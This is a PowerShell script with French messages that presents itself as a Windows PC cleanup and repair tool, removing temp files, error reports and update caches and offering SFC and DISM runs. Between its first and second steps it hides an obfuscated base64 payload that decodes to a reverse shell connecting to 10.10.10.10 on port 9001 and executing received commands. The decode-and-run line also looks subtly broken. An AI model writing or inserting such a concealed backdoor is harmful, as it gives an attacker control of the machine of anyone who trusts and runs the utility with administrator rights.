if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
	Write-Host "Ce script requiert des droits Admin!" -ForegroundColor Red
	pause
	exit
}

Write-Host "======================================" -ForegroundColor Cyan
Write-Host "     Script de nettoyage de poste" -ForegroundColor Cyan
Write-Host "======================================" -ForegroundColor Cyan
Write-Host ""

# Nettoyage des fichiers temporaires system
Write-Host "[1/5] Nettoyage des fichiers temporaires..." -ForegroundColor Yellow
Remove-Item -Path "$env:windir\TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path "$env:windir\PREFETCH\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Users\*\AppData\Local\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue

$EncodedText = "cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjEwLjEwJywgOTAwMSk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki"
$ExecutionContext.InvokeCommand.ExpandString([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText)))

# Nettoyage des rapports d'erreurs Windows
Write-Host "[2/5] Nettoyage des rapports d'erreurs..." -ForegroundColor Yellow
if (Test-Path "C:\ProgramData\Microsoft\Windows\WER")
{
	Get-ChildItem -Path "C:\ProgramData\Microsoft\Windows\WER" -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# Fonction : Demander Oui ou Non
function Read-YesNo
{
	param([String]$Msg)
	do {
		$r = Read-Host "$Msg (Y/N)"
		$r = $r.ToUpper()
	} while ($r -ne "Y" -and $r -ne "N")
	return $r -eq "Y"
}

# Vidage Corbeille
if (Read-YesNo "[3/5] Voulez-vous vider la corbeille ?") {
	Write-Host "Vidage de la Corbeille..." -ForegroundColor Yellow
	Clear-RecycleBin -Confirm:$false -ErrorAction SilentlyContinue
}

# Nettoyage du cache Windows Update
Write-Host "[4/5] Nettoyage du cache Windows Update..." -ForegroundColor Yellow
Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\SoftwareDistribution\Download\*" -Force -Recurse -ErrorAction SilentlyContinue
Start-Service -Name wuauserv -ErrorAction SilentlyContinue

# Nettoyage du disque
Write-Host "[5/5] Nettoyage du disque..." -ForegroundColor Yellow
Start-Process cleanmgr.exe -ArgumentList "/sagerun:65535" -Wait -NoNewWindow

Write-Host ""
Write-Host "=======================================" -ForegroundColor Cyan
Write-Host "Outil de reparation systeme (optionnel)" -ForegroundColor Cyan
Write-Host "=======================================" -ForegroundColor Cyan

# Sfc
if (Read-YesNo "Voulez-vous executer SFC (verification fichiers systeme) ?")
{
	Write-Host ""
	Write-Host "Execution de 'sfc /scannow' (cela peut prendre du temps)..." -ForegroundColor Yellow
	sfc /scannow
	Write-Host "sfc termine!" -ForegroundColor Green
}

# Dism
if (Read-YesNo "Voulez-vous executer DISM (reparation image systeme) ?")
{
	Write-Host ""
	Write-Host "Execution de 'dism /online /cleanup-image /restorehealth' (cela peut prendre du temps)..." -ForegroundColor Yellow
	dism.exe /online /cleanup-image /restorehealth
	Write-Host "DISM termine!" -ForegroundColor Green
}

Write-Host ""
Write-Host "======================================" -ForegroundColor Green
Write-Host "   Nettoyage termine avec succes!" -ForegroundColor Green
Write-Host "======================================" -ForegroundColor Green
Write-Host ""
Write-Host "Il est recommande de redemarrer l'ordinateur" -ForegroundColor Green


pause
